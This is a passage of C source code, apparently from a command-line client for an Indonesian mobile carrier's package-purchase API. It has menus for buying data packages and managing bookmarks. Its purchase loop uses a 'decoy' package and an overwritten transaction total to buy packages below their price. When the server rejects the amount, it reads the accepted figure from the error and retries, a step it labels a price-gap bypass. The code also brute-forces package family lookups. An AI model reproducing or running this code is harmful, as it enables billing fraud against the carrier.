                printf("[-] Gagal mengambil data Family Code. Pastikan kode benar.\n");
                printf("\nTekan Enter untuk kembali..."); fflush(stdout); flush_stdin(); continue;
            }

            cJSON* data5 = cJSON_GetObjectItem(fam_res, "data");
            cJSON* variants5 = cJSON_GetObjectItem(data5, "package_variants");

            int dec_price = 0;
            char dec_name_buf[256] = {0};
            char dec_conf_buf[512] = {0};
            char dec_code_buf[256] = {0};
            cJSON* decoy5 = NULL;

            if (use_decoy) {
                printf("\n[*] Memancing paket Decoy...\n");
                decoy5 = fetch_decoy_package(active_subs_type, B_API, API_KEY, XDATA_KEY, X_API_SEC, id_tok);
                if (decoy5 && cJSON_GetObjectItem(decoy5, "data")) {
                    cJSON* dd = cJSON_GetObjectItem(decoy5, "data");
                    cJSON* dopt = cJSON_GetObjectItem(dd, "package_option");
                    cJSON* dpi = cJSON_GetObjectItem(dopt, "price");
                    dec_price = dpi ? (cJSON_IsNumber(dpi) ? dpi->valueint : atoi(dpi->valuestring)) : 0;
                    cJSON* dnn = cJSON_GetObjectItem(dopt, "name");
                    if (dnn && cJSON_IsString(dnn)) strncpy(dec_name_buf, dnn->valuestring, 255);
                    cJSON* dcn = cJSON_GetObjectItem(dd, "token_confirmation");
                    if (dcn && cJSON_IsString(dcn)) strncpy(dec_conf_buf, dcn->valuestring, 511);
                    cJSON* dco = cJSON_GetObjectItem(dopt, "package_option_code");
                    if (dco && cJSON_IsString(dco)) strncpy(dec_code_buf, dco->valuestring, 255);

                    printf("[+] Decoy: %s (Rp %d)\n", dec_name_buf, dec_price);
                    printf("-------------------------------------------------------\n");
                    printf("Pastikan sisa balance KURANG DARI Rp %d !!!\n", dec_price);
                    printf("Apakah anda yakin ingin melanjutkan? (y/n): "); fflush(stdout);
                    char conf5[10] = "n";
                    if (fgets(conf5, sizeof(conf5), stdin) != NULL) conf5[strcspn(conf5, "\n")] = 0;
                    if (conf5[0] != 'y' && conf5[0] != 'Y') {
                        printf("[!] Pembelian dibatalkan.\n");
                        cJSON_Delete(decoy5); cJSON_Delete(fam_res);
                        printf("\nTekan Enter untuk kembali..."); fflush(stdout); flush_stdin(); continue;
                    }
                } else {
                    printf("[-] Gagal memancing paket Decoy.\n");
                    if (decoy5) cJSON_Delete(decoy5);
                    cJSON_Delete(fam_res);
                    printf("\nTekan Enter untuk kembali..."); fflush(stdout); flush_stdin(); continue;
                }
            }

            int success_count = 0;
            cJSON* var5; cJSON_ArrayForEach(var5, variants5) {
                cJSON* vname_node = cJSON_GetObjectItem(var5, "name");
                const char* vname = (vname_node && cJSON_IsString(vname_node)) ? vname_node->valuestring : "";
                cJSON* opts5 = cJSON_GetObjectItem(var5, "package_options");
                cJSON* opt5;
                cJSON_ArrayForEach(opt5, opts5) {
                    cJSON* ord_node = cJSON_GetObjectItem(opt5, "order");
                    int order = (ord_node && cJSON_IsNumber(ord_node)) ? ord_node->valueint : 0;
                    if (order < start_opt) {
                        cJSON* skip_name = cJSON_GetObjectItem(opt5, "name");
                        printf("[~] Skip opsi %d. %s\n", order, (skip_name && cJSON_IsString(skip_name)) ? skip_name->valuestring : "");
                        continue;
                    }

                    cJSON* oname_node = cJSON_GetObjectItem(opt5, "name");
                    const char* oname = (oname_node && cJSON_IsString(oname_node)) ? oname_node->valuestring : "";
                    cJSON* p_item5 = cJSON_GetObjectItem(opt5, "price");
                    int price5 = (p_item5 && cJSON_IsNumber(p_item5)) ? p_item5->valueint : (p_item5 ? atoi(p_item5->valuestring) : 0);
                    cJSON* ocode_node = cJSON_GetObjectItem(opt5, "package_option_code");
                    const char* ocode = (ocode_node && cJSON_IsString(ocode_node)) ? ocode_node->valuestring : "";

                    printf("\n=======================================================\n");
                    printf("Opsi %d. [%s] %s - Rp %d\n", order, vname, oname, price5);
                    printf("=======================================================\n");

                    cJSON* d5r = get_package_detail(B_API, API_KEY, XDATA_KEY, X_API_SEC, id_tok, ocode);
                    if (!d5r || !cJSON_GetObjectItem(d5r, "data")) {
                        printf("[-] Gagal mengambil detail paket opsi ini, skip.\n");
                        if (d5r) cJSON_Delete(d5r);
                        continue;
                    }

                    cJSON* d5data = cJSON_GetObjectItem(d5r, "data");
                    cJSON* conf5n = cJSON_GetObjectItem(d5data, "token_confirmation");
                    const char* conf5v = (conf5n && cJSON_IsString(conf5n)) ? conf5n->valuestring : "";

                    cJSON* buy5 = NULL;
                    int overwrite5 = price5 + dec_price;

                    if (use_decoy) {
                        printf("[*] Eksekusi Pulsa + Decoy [%s] (Overwrite: Rp %d)\n", dec_name_buf, overwrite5);
                        buy5 = execute_balance_purchase(B_API, API_KEY, XDATA_KEY, X_API_SEC, ENC_FIELD_KEY,
                            id_tok, acc_tok, ocode, price5, oname, conf5v,
                            dec_code_buf, dec_price, dec_name_buf, dec_conf_buf, "🤑", overwrite5, 1);

                        if (buy5 && cJSON_GetObjectItem(buy5, "message")) {
                            cJSON* mn = cJSON_GetObjectItem(buy5, "message");
                            const char* msg = (mn && cJSON_IsString(mn)) ? mn->valuestring : "";
                            if (strstr(msg, "Bizz-err.Amount.Total")) {
                                char* eq = strchr(msg, '=');
                                if (eq) {
                                    int valid_amount = atoi(eq + 1);
                                    printf("[!] Celah harga ditemukan: Rp %d. Auto-Retry (Bypass V2)...\n", valid_amount);
                                    cJSON_Delete(buy5);
                                    buy5 = execute_balance_purchase(B_API, API_KEY, XDATA_KEY, X_API_SEC, ENC_FIELD_KEY,
                                        id_tok, acc_tok, ocode, price5, oname, conf5v,
                                        dec_code_buf, dec_price, dec_name_buf, dec_conf_buf, "SHARE_PACKAGE", valid_amount, 1);
                                }
                            }
                        }
                    } else {
                        buy5 = execute_balance_purchase(B_API, API_KEY, XDATA_KEY, X_API_SEC, ENC_FIELD_KEY,
                            id_tok, acc_tok, ocode, price5, oname, conf5v,
                            NULL, 0, NULL, NULL, "BUY_PACKAGE", price5, 0);
                    }

                    if (buy5) {
                        cJSON* st5 = cJSON_GetObjectItem(buy5, "status");
                        if (st5 && cJSON_IsString(st5) && strcmp(st5->valuestring, "SUCCESS") == 0) {
                            success_count++;
                            printf("[+] Transaksi BERHASIL! (Total berhasil: %d)\n", success_count);
                        } else {
                            printf("[-] STATUS TRANSAKSI:\n");
                            char* out5 = cJSON_Print(buy5); printf("%s\n", out5); free(out5);
                        }
                        cJSON_Delete(buy5);
                    }

                    if (do_pause) {
                        printf("Tekan Enter untuk lanjut ke opsi berikutnya..."); fflush(stdout); flush_stdin();
                    }
                    if (delay_sec > 0) {
                        printf("[~] Menunggu %d detik...\n", delay_sec);
                        sleep(delay_sec);
                    }

                    if (d5r) cJSON_Delete(d5r);
                }
            }

            if (use_decoy && decoy5) cJSON_Delete(decoy5);
            cJSON_Delete(fam_res);

            printf("\n=======================================================\n");
            printf("Loop selesai. Total transaksi berhasil: %d\n", success_count);
            printf("=======================================================\n");
            printf("Tekan Enter untuk kembali ke menu utama..."); fflush(stdout); flush_stdin();
        }
        else if (strcmp(choice, "00") == 0) {
            if (!is_logged_in) { printf("\n[-] Anda harus login terlebih dahulu!\nTekan Enter..."); fflush(stdout); flush_stdin(); continue; }

            int goto_main = 0;
            while (1) {
                FILE *fbm = fopen("/etc/engsel/bookmark.json", "r");
                if (!fbm) { printf("\n[-] Belum ada bookmark tersimpan.\nTekan Enter..."); fflush(stdout); flush_stdin(); break; }
                fseek(fbm, 0, SEEK_END); long fbm_size = ftell(fbm); fseek(fbm, 0, SEEK_SET);
                char *bm_json = malloc(fbm_size + 1); fread(bm_json, 1, fbm_size, fbm); fclose(fbm); bm_json[fbm_size] = 0;
                sanitize_json_string(bm_json);
                cJSON* bm_arr = cJSON_Parse(bm_json); free(bm_json);
                if (!bm_arr || !cJSON_IsArray(bm_arr) || cJSON_GetArraySize(bm_arr) == 0) {
                    printf("\n[-] Bookmark kosong.\nTekan Enter..."); if (bm_arr) cJSON_Delete(bm_arr); fflush(stdout); flush_stdin(); break;
                }

                clear_screen();
                int bm_count = cJSON_GetArraySize(bm_arr);
                printf("-------------------------------------------------------\n");
                printf("              ⭐ Bookmark Paket ⭐\n");
                printf("-------------------------------------------------------\n");
                for (int i = 0; i < bm_count; i++) {
                    cJSON* bmi = cJSON_GetArrayItem(bm_arr, i);
                    cJSON* fn = cJSON_GetObjectItem(bmi, "family_name");
                    cJSON* vn = cJSON_GetObjectItem(bmi, "variant_name");
                    cJSON* on = cJSON_GetObjectItem(bmi, "option_name");
                    printf("%d. %s - %s - %s\n", i + 1,
                        fn && cJSON_IsString(fn) ? fn->valuestring : "-",
                        vn && cJSON_IsString(vn) ? vn->valuestring : "-",
                        on && cJSON_IsString(on) ? on->valuestring : "-");
                }
                printf("-------------------------------------------------------\n");
                printf("0.  Hapus Bookmark\n");
                printf("00. Kembali ke menu utama\n");
                printf("-------------------------------------------------------\n");
                printf("Pilih bookmark (nomor): "); fflush(stdout);

                char b_choice[16] = {0};
                if (fgets(b_choice, sizeof(b_choice), stdin) == NULL) { cJSON_Delete(bm_arr); break; }
                b_choice[strcspn(b_choice, "\n")] = 0; clean_input_string(b_choice);

                if (strcmp(b_choice, "00") == 0 || strcmp(b_choice, "99") == 0) {
                    cJSON_Delete(bm_arr); break;
                }

                if (strcmp(b_choice, "0") == 0) {
                    clear_screen();
                    printf("-------------------------------------------------------\n");
                    printf("              🗑  Hapus Bookmark\n");
                    printf("-------------------------------------------------------\n");
                    for (int i = 0; i < bm_count; i++) {
                        cJSON* bmi = cJSON_GetArrayItem(bm_arr, i);
                        cJSON* fn = cJSON_GetObjectItem(bmi, "family_name");
                        cJSON* on = cJSON_GetObjectItem(bmi, "option_name");
                        printf("%d. %s - %s\n", i + 1,
                            fn && cJSON_IsString(fn) ? fn->valuestring : "-",
                            on && cJSON_IsString(on) ? on->valuestring : "-");
                    }
                    printf("-------------------------------------------------------\n");
                    printf("00. Batal\n");
                    printf("-------------------------------------------------------\n");
                    printf("Hapus nomor berapa: "); fflush(stdout);

                    char del_str[16] = {0};
                    if (fgets(del_str, sizeof(del_str), stdin) != NULL) {
                        del_str[strcspn(del_str, "\n")] = 0; clean_input_string(del_str);
                        if (strcmp(del_str, "00") != 0 && strcmp(del_str, "99") != 0) {
                            int del_idx = atoi(del_str) - 1;
                            if (del_idx >= 0 && del_idx < bm_count) {
                                cJSON* del_item = cJSON_GetArrayItem(bm_arr, del_idx);
                                cJSON* del_on = cJSON_GetObjectItem(del_item, "option_name");
                                printf("\nHapus bookmark: %s\n", del_on && cJSON_IsString(del_on) ? del_on->valuestring : "?");
                                printf("Yakin? (y/n): "); fflush(stdout);
                                char conf_del[8] = {0};
                                if (fgets(conf_del, sizeof(conf_del), stdin) != NULL && (conf_del[0] == 'y' || conf_del[0] == 'Y')) {
                                    cJSON_DeleteItemFromArray(bm_arr, del_idx);
                                    FILE *fw = fopen("/etc/engsel/bookmark.json", "w");
                                    if (fw) { char* out = cJSON_Print(bm_arr); fprintf(fw, "%s\n", out); free(out); fclose(fw); }
                                    printf("[+] Bookmark dihapus!\n");
                                } else {
                                    printf("[!] Dibatalkan.\n");
                                }
                                printf("Tekan Enter untuk melanjutkan..."); fflush(stdout); flush_stdin();
                            } else {
                                printf("[-] Nomor tidak valid.\n");
                                printf("Tekan Enter untuk melanjutkan..."); fflush(stdout); flush_stdin();
                            }
                        }
                    }
                    cJSON_Delete(bm_arr);
                    continue;
                }

                int sel_bm = atoi(b_choice);
                if (sel_bm < 1 || sel_bm > bm_count) {
                    printf("[-] Nomor tidak valid.\nTekan Enter..."); fflush(stdout); flush_stdin();
                    cJSON_Delete(bm_arr); continue;
                }

                cJSON* selected_bm = cJSON_GetArrayItem(bm_arr, sel_bm - 1);
                cJSON* fc_item  = cJSON_GetObjectItem(selected_bm, "family_code");
                cJSON* ie_item  = cJSON_GetObjectItem(selected_bm, "is_enterprise");
                cJSON* vn_item  = cJSON_GetObjectItem(selected_bm, "variant_name");
                cJSON* ord_item = cJSON_GetObjectItem(selected_bm, "order");

                if (!fc_item || !vn_item || !ord_item) {
                    printf("[-] Data bookmark tidak lengkap.\nTekan Enter..."); fflush(stdout); flush_stdin();
                    cJSON_Delete(bm_arr); continue;
                }

                const char* bm_fcode    = fc_item->valuestring;
                const char* bm_vname    = vn_item->valuestring;
                int         bm_order    = ord_item->valueint;
                int         bm_is_ent   = (ie_item && cJSON_IsTrue(ie_item)) ? 1 : -1;

                printf("\n[*] Menarik data keluarga paket dari Bookmark...\n");
                cJSON* bm_fam = do_family_bruteforce(B_API, API_KEY, XDATA_KEY, X_API_SEC, id_tok, bm_fcode, bm_is_ent, NULL);

                if (!bm_fam) {
                    printf("[-] Gagal menarik data Family Code.\nTekan Enter..."); fflush(stdout); flush_stdin();
                    cJSON_Delete(bm_arr); continue;
                }

                char bm_opt_code[256] = {0};
                cJSON* bm_data  = cJSON_GetObjectItem(bm_fam, "data");
                cJSON* bm_vars  = cJSON_GetObjectItem(bm_data, "package_variants");
                cJSON* bm_var;
                cJSON_ArrayForEach(bm_var, bm_vars) {
                    cJSON* vn_chk = cJSON_GetObjectItem(bm_var, "name");
                    if (!vn_chk || strcmp(vn_chk->valuestring, bm_vname) != 0) continue;
                    cJSON* bm_opts = cJSON_GetObjectItem(bm_var, "package_options");
                    cJSON* bm_opt;
                    cJSON_ArrayForEach(bm_opt, bm_opts) {
                        cJSON* ord_chk = cJSON_GetObjectItem(bm_opt, "order");
                        if (ord_chk && ord_chk->valueint == bm_order) {
                            cJSON* oc = cJSON_GetObjectItem(bm_opt, "package_option_code");
                            if (oc && cJSON_IsString(oc)) strncpy(bm_opt_code, oc->valuestring, 255);
                            break;
                        }
                    }
                    if (strlen(bm_opt_code) > 0) break;
                }

                if (strlen(bm_opt_code) == 0) {
                    printf("[-] Varian/Order tidak ditemukan. Paket mungkin tidak tersedia.\nTekan Enter..."); fflush(stdout); flush_stdin();
                    cJSON_Delete(bm_fam); cJSON_Delete(bm_arr); continue;
                }

                printf("\n[*] Mengambil detail untuk transaksi...\n");
                cJSON* bm_dres = get_package_detail(B_API, API_KEY, XDATA_KEY, X_API_SEC, id_tok, bm_opt_code);
                if (!bm_dres || !cJSON_GetObjectItem(bm_dres, "data")) {
                    printf("[-] Gagal mengambil detail paket. Mungkin sudah tidak tersedia.\nTekan Enter..."); fflush(stdout); flush_stdin();
                    if (bm_dres) cJSON_Delete(bm_dres); cJSON_Delete(bm_fam); cJSON_Delete(bm_arr); continue;
                }

                cJSON* bm_ddata    = cJSON_GetObjectItem(bm_dres, "data");
                cJSON* bm_popt     = cJSON_GetObjectItem(bm_ddata, "package_option");
                cJSON* bm_pfam     = cJSON_GetObjectItem(bm_ddata, "package_family");
                cJSON* bm_price_i  = cJSON_GetObjectItem(bm_popt, "price");
                int    bm_price    = bm_price_i ? (cJSON_IsNumber(bm_price_i) ? bm_price_i->valueint : atoi(bm_price_i->valuestring)) : 0;
                cJSON* bm_name_n   = cJSON_GetObjectItem(bm_popt, "name");
                const char* bm_name= (bm_name_n && cJSON_IsString(bm_name_n)) ? bm_name_n->valuestring : "";
                cJSON* bm_conf_n   = cJSON_GetObjectItem(bm_ddata, "token_confirmation");
                const char* bm_conf= (bm_conf_n && cJSON_IsString(bm_conf_n)) ? bm_conf_n->valuestring : "";
                cJSON* bm_pfor_i   = cJSON_GetObjectItem(bm_pfam, "payment_for");
                const char* bm_pfor= (bm_pfor_i && bm_pfor_i->valuestring) ? bm_pfor_i->valuestring : "BUY_PACKAGE";

                print_package_details(bm_ddata, bm_fcode, bm_opt_code, B_API, API_KEY, XDATA_KEY, X_API_SEC, id_tok);
                handle_payment_menu(B_CIAM, B_API, B_AUTH, UA, API_KEY, XDATA_KEY, X_API_SEC, ENC_FIELD_KEY,
                    tokens_arr, bm_opt_code, bm_price, bm_name, bm_conf, bm_pfor, selected_bm, &goto_main);

                if (bm_dres) cJSON_Delete(bm_dres);
                cJSON_Delete(bm_fam);
                cJSON_Delete(bm_arr);
                if (goto_main) break;
            }
        }
        else if (strcmp(choice, "99") == 0) {
            printf("\nExiting MYnyak Engsel Sunset CLI...\n");
            break;
        }
    }
    if (tokens_arr) cJSON_Delete(tokens_arr); return 0;
}
